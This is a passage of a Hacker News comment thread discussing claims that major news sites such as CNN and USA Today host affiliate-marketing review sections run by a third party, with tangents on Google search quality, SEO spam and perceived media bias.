and sorting through a decentralized and open Internet. This chain of events does not support that. The trend is for gatekeepers to panic. The search results have been sabotaged as a result. Is Google more valuable as a gatekeeper for established institutions? Can that amount to more value than the potential ad revenue of a larger web? Time will tell. reply crazygringo 4 hours agoparentprevWhat signals do you think Google should be using instead? I presume they made the change because their search results were filling up with blogspam, and there was no algorithm that could detect a high-quality review from a spam one. So what do you think would have been the right approach? reply jerf 3 hours agorootparentPeople pointing out problems are not obligated to provide solutions. I don't know where this idea comes from, but it's just wrong. If there was a solution to this problem from the search engine's point of view 5 years ago, which I do not stipulate but let's roll with it, there isn't one now. ChatGPT can overcome basically all detection techniques when combined with the current amount of efforts already largely successfully avoiding detection, and it will continue to get better. There are no signals for random unattested web content that will separate what we want from stuff constructed to look like what we want but with embedded motivations or content we don't. A web of trust may be inevitable, but it's not like that can't be attacked either, especially past the first hop. It seems inevitable that slowly but very surely our trust is going to get pulled in much, much more tightly than it is now. I don't see much that can be done about that, even in theory. It was a historical accident that we ever could trust random websites to not be 100% focused on their own interests, simply because the tech to do that wasn't there yet. Now it is, and we will be entering a world where we can not trust any free resources, whether we like it or not. reply crazygringo 1 hour agorootparent> People pointing out problems are not obligated to provide solutions. And nobody said they were obligated to. So I don't know what you think you're responding to. I assume it's OK to ask people what they think a solution should be, though? Seems like a pretty natural, conversational follow-up, if you ask me. Presumably if you know a situation well enough to criticize, you have at least some ideas of what alternatives might or might not be better. Or can elucidate why you think there might not be any better ones. Or do you think the entire act of asking questions is \"just wrong\", to use your phrase? reply jerf 1 hour agorootparentIt is an extremely common tactic used to shut down conversations about problems. If that wasn't what you were doing, I apologize to you for being wrong this time, but I don't apologize for making the mistake in the first place, because it's fairly well-founded based on extensive experience. reply photonthug 3 hours agorootparentprev> a world where we can not trust any free resources Or paid ones, really. If you think a company is trustworthy, that means a) you believe it cares about losing you as a customer, or b) you believe the company has the obligation or the luxury of acting with integrity (or the people working there do). Especially with news media, none of these things are likely to be true. For paid news I’d just expect less typos but not more integrity. reply kuschku 3 hours agorootparentprevIt's really easy to find real reviews. The magic trick is -affiliate -amazon. You can add other qualifiers as well. Try it: https://www.google.com/search?q=macbook+m3+pro+review+-affil... Reviews financed via affiliate links are just camouflaged ads. So Google should offer a filter to remove all of them. I add similar qualifiers to almost all of my searches. They make the web feel like it's 2010 again. reply kuschku 17 minutes agorootparentEDIT: If Google decides to ever remove this useful feature as well, here's an archive link showing what the results used to look like at the time of posting: https://archive.is/5KwA6. reply eproxus 1 hour agorootparentprevAwesome tip. I made a Kagi lens with these settings: https://kagi.com/lenses/0MqOTt5t5MajrIkHAqHEgDeoKzF1a4TS (Can’t share example results since Kagi doesn’t let you share results from lenses) reply janalsncm 1 hour agorootparentThe results would only be notable if they were substantially better than the Google results. reply richwater 1 hour agorootparentDoesn't Kagi currently pay to access Google's index? reply sherr 3 hours agorootparentprevThat seems to be a great tip. Thanks. reply hedora 4 hours agorootparentprevI don’t use Google, but I used to pay for Apple News. Apple uses algorithmic ranking by story, and pays news sites by article views. It is basically all spam. If you block the spam sites, their stories still show up in your feed with a note that you blocked the site. Instead, they should let people structure their feeds by news organization, like podcast apps do. They should steer you back to reading the sources you’ve opted into, and mix in a bit of stories from related news organizations, not stories with high content similarity, or high “trending” scores. (As far as I know, Apple News+ is the only product still operating in the paid news aggregator space, but if there’s another one, I’d love to hear about it.) reply saghm 3 hours agorootparentI've been using Feedly for a bit now after something changed with the Google aggregator that Android has available as an option on the home screen changed something and became impossible for me to filter out certain sources from (maybe related to the engine changes discussed in this thread and in the article?) It's solidly...okay. It's very good aggregating everything I want, and for the most part it's able to avoid things that I'd absolutely not be willing to overlook, but it has some quirks in terms of the filters weirdly not working for me on fairly benign topics (no matter how much I try, I can't get it to stop showing me content from various sports like soccer, basketball, and golf despite the only sport I care about being baseball). They seem to really hype their AI features in the app, which is a little weird because I don't care how they aggregate behind the scenes and they shouldn't need AI to be able to filter articles they literally already tag as \"golf\" when I have \"golf\" listed in my filters as \"never show\", but it's not annoying enough that I've bothered trying to find an alternative yet. reply fhdsgbbcaA 3 hours agorootparentprevI have to say showing you content from blocked channels is the most user hostile thing I encounter on a daily basis. The contempt for one’s users is such a defining feature of this era of late-stage tech. reply gamacodre 3 hours agorootparentprev> Instead, they should let people structure their feeds by news organization Doesn't this immediately turn into the kind of problem TFA is bemoaning? Once a news organization gets traction (opt-ins in this case) on a platform, they'll inevitably start selling space in their feed to one or more crappy aggregators. To the C-suite this looks like free money, since somehow they always manage to convince themselves that the brand damage from it will be minimal or at least manageable. It sucks. reply lupusreal 2 hours agorootparentprev> If you block the spam sites, their stories still show up in your feed with a note that you blocked the site. Users' respect for Apple is matched in magnitude by Apple's disrespect for users. reply fhdsgbbcaA 3 hours agorootparentprevDoubleClick slowly killed Google search because the best way to make money in display ads is to run clickbait. In the one hand, Google paid good quality websites more money for trash content and engagement bait than quality content. So they adapted to that new market reality. Meanwhile, the real money maker - Search - gradually got filled up with lower quality content and now it’s imploding. Google buying DoubleClick has a lot of parallels to what happened with Boeing. reply scrivna 4 hours agorootparentprevIMO the internet is just a bad place to look for reviews nowadays, unless you really trust someone and know they aren’t being paid to review the product. Likewise Amazon reviews I consider mostly fake. For products I want to buy I look at what brick and mortar stores sell, they have skin in the game and can weed out the truly bad. reply walterbell 4 hours agorootparentprev> was no algorithm that could detect a high-quality review from a spam one In that scenario, the search engine could show an empty page plus their screened ad network results. Perhaps a link for querying Reddit or other social media. For the most profitable/contested review queries, some combination of algo and paid humans for feedback/curation. reply janalsncm 1 hour agorootparentprevThe right approach would’ve looked something like what the author of this article did. None of it was that technically complicated. reply stickfigure 1 hour agorootparentprevThese days I ask chatgpt what the people of reddit think. reply realusername 3 hours agorootparentprev> there was no algorithm that could detect a high-quality review from a spam one. I really hope for them it does exist because otherwise Google is screwed. reply dehrmann 2 hours agoparentprev> we spent N weeks testing K products to root out the very best Does the Wirecutter no longer actually do the leg work? reply dialup_sounds 1 hour agorootparentWhether they do or not, Wirecutter was such a successful format that everybody else copies the style when when writing fake reviews. The giveaway is when every item in a category happens to be the best at something that could be read off the spec sheet and they never actually recommend one: This one has the best sound quality, this one is the budget pick, this one is best for people with cats, this one has more battery life, etc. reply bitwize 4 hours agoparentprevBefore Google, unscrupulous web sites would try to SEO themselves into the top page of search results with repeated META tag bombs or sometimes just good old fashioned whitefonting. One of the innovations of PageRank was that more widely linked-to web sites would be ranked as more authoritative, doing an end run around the kind of keyword spam that plagued the early web. If the most widely linked-to web sites wish to play ball with SEO marketroids, that undermines the trustworthiness that PageRank assumes for those sites. The upshot of this is that no system is impossible to game. reply jmull 3 hours agoprevIs \"fake\" the right word? I was under the impression that the generic \"news\"/\"information\" on many sites is purchased (or otherwise obtained through some kind of business relationship) from some other organization. And I just don't get this perspective from the article: \"For some unfathomable reason, CNN agreed to a deal. What the fuck CNN? You’re CN fucking N. What in god’s name convinced you this was a good idea? And you already had a ramped up affiliate program. I say again: what the fuck CNN?\" I guess I can't figure out what the problem is supposed to be here. I don't think there's necessarily a problem with fleshing out a site with generic content. I would guess CNN has an agreement with the content provider on the general character of content, and can surely opt out of things they don't want to be associated with. FWIW, I opened \"CNN underscored money\" and at the top of the page it says: \"Content is created by CNN Underscored’s team of editors who work independently from the CNN Newsroom. CNN earns a commission from partner links on the site but the reporting here is always independent and objective.\" (plus there's an \"advertiser disclosure\" link but I didn't click on it). I just don't get what the problem is here. reply RobRivera 3 hours agoparent>\"For some unfathomable reason, CNN agreed to a deal. What the fuck CNN? You’re CN fucking N. What in god’s name convinced you this was a good idea? And you already had a ramped up affiliate program. I say again: what the fuck CNN?\" Anytime I hear outrage rhetoric i lose all interest in the author's words. Its like they have completely forgotten what relativity is. reply yriehhdjf 3 hours agorootparentWhat would you consider the relative element in this scenario that explains the decision then? Or was your point simply that emotive language automatically discredits a speaker's point? reply hindsightbias 3 hours agorootparentMy eyes read it as reality. I think it fits too. reply ndiddy 3 hours agoparentprevThe problem is that Google defines what these sites are doing as spam: https://developers.google.com/search/docs/essentials/spam-po... > Site reputation abuse is when third-party pages are published with little or no first-party oversight or involvement, where the purpose is to manipulate search rankings by taking advantage of the first-party site's ranking signals. Such third-party pages include sponsored, advertising, partner, or other third-party pages that are typically independent of a host site's main purpose or produced without close oversight or involvement of the host site. It means that consumers will be shown reviews written by affiliate marketers rather than real people because the affiliate marketers get to leech off of Forbes's, CNN's, or USA Today's domain reputation. Despite this, Google is either unwilling or unable to derank major sites over this issue. reply jmull 2 hours agorootparentRE \"...with little or no first-party oversight or involvement...\" and \"...without close oversight or involvement of the host site...\" Why do you think there isn't oversight or involvement from CNN? reply ndiddy 2 hours agorootparentFor the CNN Underscored Money example, none of the writers or editors on the site work for CNN. They're all contractors who work for Marketplace, an affiliate marketing company. The site is hosted on completely separate infrastructure from CNN Underscored, just skinned to look similar to it. They even have a different privacy policy just for CNN Underscored Money. If CNN had major oversight or control of the content on CNN Underscored Money, you would think they would host it themselves rather than allowing an affiliate marketing company to independently operate the category. reply jmull 2 hours agorootparent> They're all contractors who work for Marketplace ... The site is hosted on completely separate infrastructure from CNN Underscored, just skinned to look similar to it. They even have a different privacy policy just for CNN Underscored Money. But those things have nothing to do with whether or not CNN has involvement and oversight over the CNN underscored content. I have no idea myself, but you certainly can't infer it from irrelevant facts. reply magic-michael 2 hours agorootparentprevAbsolutely, spot on. These publishers aren't just letting anyone post. If you actually check, the writers are legit experts in their fields. Take a look at the authors and their LinkedIn profiles—they’ve been covering these topics for years reply jccalhoun 4 hours agoprevI haven't had cable for a long time so I can't say anything about the quality of the programming on the CNN channel. However, cnn.com has been full of affiliate links and barely detectable \"sponsored\" stories for years. reply _heimdall 4 hours agoparentIts particularly comical because many of the recommendations, including from the US government, for identifying fake or untrustworthy news sites include factors that would indicate CNN's site is fake. A hard one to define is a common recommendation is that a legit news site will look and feel professional. A more specific one is that a fake news site will be filled with a large number of ads. That doesn't even touch on the other factors like unbiased articles that share both sides of an issue. reply GiorgioG 4 hours agorootparentLet's be real, CNN, Fox News, etc are all fake/propaganda. On Fox News, Trump can do nothing wrong, Biden can do nothing right. On CNN it's nothing but sunshine and rainbows for Harris/Biden and the opposite for Trump...I mean look at this story title from CNN's current frontpage: \"Roy Wood Jr. reacts to Trump’s ongoing McDonalds remarks\" I'm an independent and as far as I can tell there is zero attempt at unbiased factual reporting of the news. reply InvisibleUp 4 hours agorootparentYou might have some luck with news wire services such as Reuters or the Associated Press. reply Mathnerd314 3 hours agorootparentprev> unbiased factual reporting I don't think that has ever existed, but the closest I've found is Wikipedia. It is surprisingly detailed, particularly on current events. reply basil-rash 3 hours agorootparentFor mainstream folks, perhaps. The second you even go slightly outside of what the media has declared kosher it goes off the rails. Take RFK’s page, for instance, which is just a collection of inflamed opinions soured from “reputable“ news outlets. reply internetter 2 hours agorootparentIn your opinion, what is some misinformation on RFK's page? Have you read the discussions on the talk page? If your concern has not been extensively discussed, have you raised it on said page? Here is a link: https://en.wikipedia.org/wiki/Talk:Robert_F._Kennedy_Jr. reply moi2388 3 hours agorootparentprevYou find? I usually find it more and more edited to favour left-wing and work views on current and political events. I just go to severs social media sites so I get at least both biases reply internetter 2 hours agorootparentWikipedia is free for everyone to edit. The policies are strongly aligned with the pursuit of truth. Both parties can have truths in their favour, if editors are in a left wing bubble they may just be more exposed to truths from a left perspective. Here's where you can help! If you identify bias, feel free to remove charged language, and add new ideas with reliable citations. Here's a list of sources considered reliable: https://en.wikipedia.org/wiki/Wikipedia%3AReliable_sources%2... Extensive discussions of the decision making process for each source is documented in this list. reply SoftTalker 4 hours agorootparentprevI am so glad I decided to tune out of this election cycle. Is anyone really undecided? If you're not, just don't watch. I have no idea what Trump is saying about McDonald's and I like it that way. reply kspacewalk2 3 hours agorootparentElections are all about turnout. Hence, election campaigns mostly aren't about convincing the undecided. They're mostly about motivating and energizing your voters to show up on election day (get out the vote!), and demoralizing and confusing the other side's voters to stay home (you're principled, but your candidate is un-yoursidesian and cannot be trusted). reply SoftTalker 3 hours agorootparentI'm going to vote, as I always do. I don't need manufactured outrage as a motivator. Unfortunately that is what ad-driven social media and news needs to get eyeballs, so it's all we've got. reply Der_Einzige 3 hours agorootparentprevYou massively overstate the political bias that CNN has. I can find articles that are critical of Biden/harris all day on CNN! https://www.dailymail.co.uk/news/article-13868889/cnn-attack... https://www.cnn.com/2024/09/14/politics/fact-check-harris-ca... But please, keep lying about how CNN doesn’t criticize Harris/biden! It fits into the destabilizing narrative that “the media” is “corrupt” or “bought and paid for”. Also, if you want unbiased media, CSPAN is that. No bias except from how the camera is physically pointed into congress. You won’t watch it because it’s too boring and despite all the hatred your profess to have against biased news, the idea of news not as entertainment is alien to you. reply sutra_on 3 hours agorootparentAre you saying that if I don't enjoy watching live video of e.g. an anthill 24/7 then I am actually not interested in unbiased media and crave drivel like CNN? That's... one way to reason I guess. reply Der_Einzige 2 hours agorootparentThe better analogy would be \"If I don't enjoy watching a live video of an anthill 24/7 than I am actually not interested in studying or learning about ants\". To which my response is \"those who don't do, teach\" and to point you to in-fact, do your ant observational studies anyway (i.e. watch CSPAN) because it really, really is the only way to stop seeing quite as many shadows on the wall and see a tiny glimpse of how politics actually works. Seriously, most of the folks making real discovery today in some animal studies field is doing it from long periods of observational studies in the field. Books from academics are so full of lies due to publish or perish, academic careerism, widespread, systemic, structural, and at the highest levels academic fraud/dishonesty, and more. Watch CSPAN, or you will be lied to. Sorry not sorry that it's boring as shit. That's the reality of politics, it's mostly boring. reply _heimdall 2 hours agorootparentprevArguing that news outlets have a bias does not mean they are 100% biased. You will find examples of articles and segments against Harris on CNN, you will also find articles and segments against Trump on Fox News. It isn't the norm though. The most telling for me is generally the photos picked by a news outlet. On CNN for example, photos of Harris (and Biden) are almost always picked to show them in a favorable light. They'll be shot standing at a podium with an American flag behind them and a big, natural looking smile on their face. Photos of Trump are from off angles with an angry look on his face, often taken mid speech where a face will look more contorted than when smiling. Are news outlets 100% biased mouthpieces pieces? Of course not. But they have a strong bias towards one party or the other and they don't try very hard to hide it. reply Der_Einzige 2 hours agorootparentSaying stuff this obvious to debunk it's like AI skeptics saying \"AI can't solve X\" when it's literally trivial to try their query and then the AI system straight up just solves it. Let's look at some recent CNN photos of each of them! https://media.cnn.com/api/v1/images/stellar/prod/gettyimages... https://media.cnn.com/api/v1/images/stellar/prod/20240921-po... https://media.cnn.com/api/v1/images/stellar/prod/2024-09-26t... https://media.cnn.com/api/v1/images/stellar/prod/gettyimages... https://media.cnn.com/api/v1/images/stellar/prod/20240721-02... (sources) https://www.cnn.com/2024/09/27/politics/cnn-poll-harris-trum... https://www.cnn.com/2024/09/27/politics/harris-southern-bord... https://www.cnn.com/2024/08/29/media/abc-presidential-debate... reply _heimdall 2 hours agorootparentTwo issues with you trying to debunk me here. First, part of my claim is that you absolutely can find examples where CNN puts Harris or Biden in a bad light. To properly debunk me you would need an analysis of how frequently they show either party candidate in a good vs. bad light. Second, and more importantly, you're trying to debunk what I clearly stated as my experience of viewing CNN. I didn't claim it to be a universal truth, only a pattern I have noticed when I have taken the time to browse CNN's site. Debunking is useful when someone is proposing an argument as a scientific, or logically based, argument. Its pretty useless when the statement is only based on personal, anecdotal experience. reply silexia 2 hours agorootparentprevX.com is the only reliable source of news now as people from all political views do independent reporting there and Community Notes fact checks them. reply _heimdall 1 hour agorootparentI was never much of a Twitter user, but I have a really hard time believing that any social network incentivizing short comments and social validation through likes/shares and an algorithmic feed will ever be a reliable source for unbiased views. reply kube-system 48 minutes agorootparentprevThat site is, and always has been, full of hot takes and sensationalism which are often out-of-context or misleading. Regardless of viewpoint. And most evidence shows it is a top target for intentional disinformation attacks by institutionally-sponsored troll farms. It is very easy for people to end way down the rabbit holes of an echo chamber on that site and find themselves exposed to niche accounts that don't receive any fact checking or counterarguments. reply rootusrootus 2 hours agoprevIn related news, almost everything you can find through a Google search is unmitigated crap. Finding it on Google is an indictment of the quality. Back in the day, something like Wikipedia was what people dreamed the Internet would be. How naive of us. I half expect to start seeing new incarnations of things like Prodigy or Compuserve spin up, aiming to provide an Internet-within-Internet type of experience. Without advertising, purely pay-to-play. Sure, a lot of regular people will never pay for such a thing, but I bet there are enough of us that will pay for good quality content (and shielding from crap) that it could be viable. Maybe the 'net gets balkanized and the 'free' part left as a wasteland. (or maybe I'm just a grumpy old man and I should go get a cup of coffee and quit my bitching) reply tomjakubowski 2 hours agoparent> Finding it on Google is an indictment of the quality. Back in the day, something like Wikipedia was what people dreamed the Internet would be. Well there is good news: Wikipedia is still around and it's as good as ever. I share your sentiments about Google results. I've thought before about setting myself up a little terminal which denies access to everything on the web besides Wikipedia and .edu. That's where most of the good stuff online is. (ok, maybe Atlas Obscura and Sheldon Brown's bicycle page are allowed too) reply doodda 3 hours agoprevThere are SEO agencies that do this as a model. I know because I have been pitched by them. 1. You run a content website with a strong domain rating. 2. They approach you with an offer of creating a subsite (your brand + advisor, marketplace, etc) on your domain 3. They write all the content and completely manage the subsite - you have 0 risk (aside from brand risk) 4. You split the affiliate revenues from the subsite 5. The internet is now full of shitty content shilling diet pills and google can't figure it out reply streptomycin 4 hours agoprevIn 2005, some scammy ad company paid me to do similar stuff - let them completely control some pages on a high ranking domain. Google figured it out after a few months and blacklisted my entire domain until I removed them. Crazy that this is still an issue. reply hedora 3 hours agoparentI’ve noticed that certain companies become too big to fail, and then they just start breaking the rules. For instance, Experian stole my credit card number once. The fraud department at my national megabank said that Experian was responsible for over half their case load. You’d think that the credit card processing networks would have blocked the Experian payment processing account at that point. I think they would have blocked pretty much any other company on earth. reply westcort 4 hours agoprevPublishers sometimes have advertorial divisions. This is not a new phenomenon. No, this does not prove true your favorite candidate’s lies or alternative realities. reply CryptoBanker 3 hours agoparentYou’re the only one bringing up politics reply westcort 2 hours agorootparentIt is not about a particular politician--or are you reading this a particular way because of a truth about your favorite candidate you know, but do not want to be said? See also partisan views from this thread (as opposed to this non-partisan comment): https://news.ycombinator.com/reply?id=41670882 https://news.ycombinator.com/reply?id=41671053 reply arbuge 3 hours agoprevIt's good research but whatever you think about the value of the content on those sites, I think the word \"fake\" in the headline is misleading clickbait. These sites are officially linked to from the parents (CNN and USA Today in this case), with whom they no doubt have a revenue-sharing agreement. They're very real in all senses of the word. The third party in question (Forbes marketplace) is not trying to fraudulently set up some parallel CNN and USA Today websites without their authorization. reply ethagknight 4 hours agoprevInteresting find, serious question: does it matter? reply afavour 4 hours agoparentIMO it does. It’s reflective of these news organizations not caring about their brand reputations and instead just looking at the $$$. Having an entirely separate staff, with a separate website, publish content under your name without your input ought to be a five alarm fire for editorial staff. But there’s some affiliate cash up for grabs so some senior exec somewhere okayed it. There’s a tech angle here too: if it weren’t for SEO they might we’ll be operating out of cnnunderscore.com or whatever, but the SEO juice of a page on cnn.com is too tempting to pass up. reply azemetre 4 hours agorootparentDoesn't Google also punish small sites that do similar things? Like if I made a site that was sincere as an individual where I review kitchen utensils where I add affiliate links I'd be penalized, but the larger established domains are allowed to do the same thing without Google punishing them? reply greg_V 3 hours agorootparentBingo. All the small shops who were doing actual reviews got wiped out, and this blog is basically documenting the new age of parasite spam eating the web and raking in millions. reply SoftTalker 3 hours agorootparentOnline reviews are completely gamed IMO. My wife still looks at them, talks about the \"highly rated\" stuff she finds, and I tell her it's all fake she doesn't believe it. reply magic-michael 3 hours agorootparentprevNot all of those sites were innocent of doing it the correct way. reply azemetre 1 hour agorootparentMaybe not, but Google, with its monopoly, should play fair and not pick favorites because it increases their ad dollars bought. reply magic-michael 3 hours agorootparentprevHow do you now they are completely separate? Or that there is no oversight? Answer: You don't know. You're just speculating. reply stackghost 4 hours agoparentprevMonoculture in journalism definitely matters. News media has a profound ability to shape and direct the discourse in society writ large, and the slow consolidation of news media in some countries is extremely problematic because it enables private individuals to exert undue influence in pursuit of their agenda that may or may not be at odds with the public interest. In Canada, for example, it's hard to throw a stone and not hit a foreign-owned PostMedia news outlet. reply VancouverMan 3 hours agorootparentI don't particularly care who owns such outlets. What matters to me is the validity of the content being produced, regardless of who produces it. If foreign-owned outlets do a better job than locally-owned outlets at providing factual, complete, and as-objective-as-possible reporting, that's fine with me. When I consider events or situations I've had direct knowledge of, or where I've had access to direct witness accounts and raw footage that I trust, some of the worst reporting in my opinion has been from CBC News. With CBC being a Crown corporation, CBC News could perhaps be considered the most inherently \"Canadian-owned\" of the mainstream news outlets. On the other hand, for such situations, I've generally found reporting from Postmedia's various outlets to be among the most accurate, complete, and objective of that from the mainstream outlets, even if it may be considered foreign-owned. reply stackghost 2 hours agorootparent>What matters to me is the validity of the content being produced, regardless of who produces it. If foreign-owned outlets do a better job than locally-owned outlets at providing factual, complete, and as-objective-as-possible reporting, that's fine with me. As we've seen time and time again, the content produced is only \"valid\" if your personal interests happen to align with those of Rupert Murdoch, or whomever. CBC definitely has its own problems but being beholden to the biases of the billionaire class isn't one of them. reply hindsightbias 3 hours agorootparentprev> slow consolidation Move slow, break countries. reply bityard 4 hours agoparentprevFrom what I'm to gather by reading Part One, the author runs his own affiliate link SEO sites and is mad that big-name brands are doing it better by leveraging business deals and brand recognition. reply simmonmt 4 hours agorootparentGreat. So he's well-motivated to dig up and publicize hitherto-unknown (or barely-known) shenanigans from Forbes etc al, and he knows where to look. If he wasn't going to investigate this, who would? CNN? USA Today? reply w0m 3 hours agorootparent> publicize hitherto-unknown (or barely-known) shenanigans It's disclosed on a banner across the top of literally every cnn-uncensored page that's being 'outed' here. He could have saved the entire research/dig by simply screenshotting the top of any of the pages. That wouldn't have the same energy or 'Ahah!' though. reply ethagknight 1 hour agoparentprevI am absolutely shocked to read the replies from everyone thinking \"journalistic integrity\" was a thing practiced by American Media. Clearly, everyone runs the same stories, same soundbites, same focuses. How could one think \"the news\" nationwide across 1000s of different outlets just happened to hone in on the same dozen-or-so topics on a daily basis. reply belter 4 hours agoparentprevIndeed.It's a nice effort...but specially for these two organizations, is a bit like taking a sinking ship and before it disappears underwater...Deciding to set it on fire...:-) reply Mistletoe 4 hours agoparentprevYes I’d be disturbed if my news source was run by Forbes Marketplace. But it would explain a lot. reply mpalczewski 4 hours agorootparentPropaganda source reply concordDance 3 hours agoparentprevIt matters because we consider them reliable sources: https://en.wikipedia.org/wiki/Wikipedia:Reliable_sources/Per... Wikipedia is the most reliable source of news/perspective on issued but it can get contaminated if entities given the \"reliable sources\" label republish unreliable or biased dreck. reply karol 3 hours agoprevMilking old established brands such as Telegraph, Guardian and the likes with affiliate and sponsored content has been going on for ages in the UK. reply farceSpherule 4 hours agoprevWho in the hell reads CNN, USA Today or Forbes? They are all rags. reply jabroni_salad 4 hours agoparentusatoday owns soooo many local newspapers. Where I live if I want local news it's either them or my local NPR station and pretty much nothing else. reply SoftTalker 3 hours agorootparentMy local paper was sold to Gannett (USA Today) a few years ago. It's a complete shadow of what it used to be (to be fair the decline started long before the sale, as with many local papers). They are down from a full newsroom to a handul of local reporters, I'm not even sure all of them are full-time. Most of their content is just USA today stories or news from other Gannett papers. There are a couple of bloggers who cover local government, otherwise there's really no in-depth local reporting on anything anymore. reply dingnuts 2 hours agorootparentI can't speak for every local but the \"local paper\" where I live is effectively the RSS feeds of the local CBS & NBC news stations' websites and the reporting is actually quite good, or at least, it's a LOT better than receiving no local reporting. The actual local paper is as you describe. I don't understand why local TV has weathered the digital transition better, exactly, but I find that I get a LOT of the local coverage that I want this way and I'm eager to recommend this to strategy to others (as you can see) reply alecco 3 hours agoparentprevThese SEO garbage subsites rank high in Google results. That's the point of the article. reply burkaman 3 hours agoparentprevCNN is the most popular news website in the US by a huge margin and they are confident enough in their position that they're going to start testing out a paywall next month. reply HeatrayEnjoyer 3 hours agorootparentSource? reply suyash 4 hours agoprevWhat can you expect from main stream media? It's mostly either propaganda or commercials wrapped up as new stories. reply tdb7893 4 hours agoparentWhere do you think people should get news? Most of the non-mainstream news is somehow worse and finding knowledgeable direct sources isn't really practical for people. reply chasebank 1 hour agorootparentThe top comment in this hn post from a few years ago really stuck with me. I'll paste here. \"Seems an appropriate time to post my favourite piece on news addiction by Charles Simic in the NYRB. \"I’m having trouble deciding whether I understand the world better now that I’m in my seventies than I did when I was younger, or whether I’m becoming more and more clueless every day. The truth is somewhere in between, I suspect, but that doesn’t make me rest any easier at night. Like others growing old, I had expected that after everything I had lived through and learned in my life, I would attain a state of Olympian calm and would regard the news of the day with amusement, like a clip from a bad old movie I had seen far too many times. It hasn’t happened to me yet. My late father, in the final year of his life, claimed that he finally found that long-sought serenity by no longer reading the papers and watching television. Even then, and I was thirty years younger than he, I knew what he meant. What devotees of sadomasochism do to their bodies is nothing compared to the torments that those addicted to the news and political commentary inflict on their minds almost every hour of the day.\" https://www.nybooks.com/daily/2011/12/05/goodbye-serenity/ Edit: Charles Simic is a Serbian-American poet who lived through WWII and saw some really grisly things, some described briefly in the article, hence \"after everything I had lived through and learned in my life...\"\" https://news.ycombinator.com/item?id=23938007 reply r3trohack3r 1 hour agorootparentprev“Briefly stated, the Gell-Mann Amnesia effect is as follows. You open the newspaper to an article on some subject you know well. In Murray's case, physics. In mine, show business. You read the article and see the journalist has absolutely no understanding of either the facts or the issues. Often, the article is so wrong it actually presents the story backward—reversing cause and effect. I call these the \"wet streets cause rain\" stories. Paper's full of them. In any case, you read with exasperation or amusement the multiple errors in a story, and then turn the page to national or international affairs, and read as if the rest of the newspaper was somehow more accurate about Palestine than the baloney you just read. You turn the page, and forget what you know.\" – Michael Crichton (1942-2008) I do not believe centralized content distribution channels will ever act as a reliable source of information. Find distribution channels that keep you plugged into the zeitgeist; some form of streaming our collective consciousness. And then do your own research on the topics that matter to you. reply chiefalchemist 4 hours agorootparentprevI agree that choices are limited. Nonetheless, the days of trusting \"the news\" media are long gone, at least for now. You can get *information* from CNN, etc. but that doesn't make it news, nor does it mean you're getting the full story and proper insights. Listen. Think about what is said. Think harder about what is not said. Check another source. Repeat. reply SoftTalker 3 hours agorootparentYes, sadly it's a cliche but you have to \"do your own research\" and most people don't have the time or don't want to spend their time that way. Maybe there are still some monthly periodicals that do in-depth news, since they aren't trying to get an exclusive or be the first to break the story they would not be so motivated to just vomit clickbait continuously. But I don't know who they are. I've largely just stopped paying attention. It's sad in a way, as I grew up with the lesson that paying attention to the news and current events was important. But it's all garbage now. reply chiefalchemist 2 hours agorootparentI'm no different than anyone else in that I don't have a lot of time. Where I have noticed I'm different is how closely I listen, how critical I am of what I hear, and how often I question what I did not hear. The other difference is, my BS detector for editorial - positioned as \"news\" / \"journalism\" - is very well oiled. I accept opinion - I have no choice - but I don't in my mind treat it as fact. Most people seen to get caught up in looking for confirmation bias that they abandoned critical thinking. Most people hear what they want to hear, and the media is more than happy to feed them that comfort. Let me give you an example, a couple of weeks ago I saw a story that the Sahara Desert (Africa) is greening. I noticed that from a number of different sources and each source used the same phrase for this[1]: \"unusual weather patterns\". Huh? Why is greening from \"unusual weather patterns\" but when there's damage it's *always* from \"climate change\"? No one I know caught the Orwellian sleight of hand. Along the same lines, The Washington Post ran a story last week about the science of climate. It was even shared on HN. No one seemed to notice. Odd because it effectively said, up to now there was no definitive study on the history of the earth's climate. So up to now what were all \"the experts\" basing their \"science\" on then? Hearsay? Mindless parroting? Worst was this study effectively made a case for climate change might not be human-made, simply because over time climate has been very dynamic and at time extreme. Per this study and the graph it publish there is no \"normal\". These were both in plain sight. And yet crickets. Maybe I should stop thinking and put more time into keeping up with the Kardashians? [1] The fact that they used the same phrase also told me, they invested zero resources in this story and were merely parroting the narrative provided by the news service they were using. Note: This approach by definition is not journalism. reply suyash 4 hours agorootparentprevYouTube - tons of YouTubers who are independent, X - raw, fast, first hand news, Not saying don't go to mainstream news, just know the bias they may have. reply w0m 3 hours agorootparentAlso make sure you take those same youtubers as what they are; raw, independent, and with less accountability than larger platforms insofaras accuracy of content. That isn't to say a smaller creators/channels are bad or not worth while, but being aware of context as you consume is important. We've unfortunately stopped caring about accuracy or accountability in many instances. reply tdb7893 4 hours agorootparentprevSo for YouTube I haven't been able to find quality reporting for the most part (outside of an occasional niche issue). For X my experience is that it's essentially impossible for me to vet personal accounts that people have. Also it runs into the issue where everything is just anecdotal so it's easy to get an inaccurate picture from that sort of information. This is without even getting into the huge problem with bots and even state level disinfo on X (and social media in general). Not that I don't use it at all, it's just not trustworthy or accurate for most things. Edit: not that \"mainstream media\" doesn't have some of these issues. It's just not as bad as some of these other sources and it's much easier to get a sense for specific organizations than trying to understand the bias and veracity of a myriad of YouTubers and random people on X. Like it's much easier to understand the biases and issues of Reuters than a bunch of YouTubers and random people on X so for basic information I will go to places like Reuters first. Edit2: for issues with YouTubers you have to remember they make money through engagement (and real news is less engaging). I think this is a lot of what's killed traditional media so I doubt YouTube, which is if anything more tied to this, is unlikely to be better. Then also look at the recent Tenet Media scandal. Like yeah I get some news from YouTubers but it's a real minefield when it comes to good information. reply wredue 4 hours agorootparentprevYou suggest that I get my news from a place that vehemently pushes flat earth videos to me because I happened to watch a video laughing at them? YouTube has an extreme bias to pushing conspiracy theory content. reply calimoro78 4 hours agoparentprevWelcome giant sweeping generalizations that are unsupported by data nor stringent arguments. reply w0m 4 hours agoparentprevhonestly the base concept of 'mainstream media' is simply dumb. It's just a convenient way to group 'the other guy' up with conveniently ignoring 'not mainstream' media doing the same or worse. \"they control the media you can't believe anything they say!\" being spewed on the platform with by-far the largest market share/reach. reply jefb 4 hours agoprevNice bit of sleuthing here, well done. Anyone know where those search traffic graphics are made from? reply greg_V 4 hours agoparentahrefs by the looks of it reply calimoro78 4 hours agoprevIt does not bother me that the Money and Shopping sections of CNN are run with content by another firm that specializes in interest based articles while the core of CNN remains focused on world news. reply greg_V 4 hours agoparentThe story is that it goes against google's guidelines and yet it continues to outrank sites that are within google's guidelines. reply Dotnaught 2 hours agoprevI'd be interested to 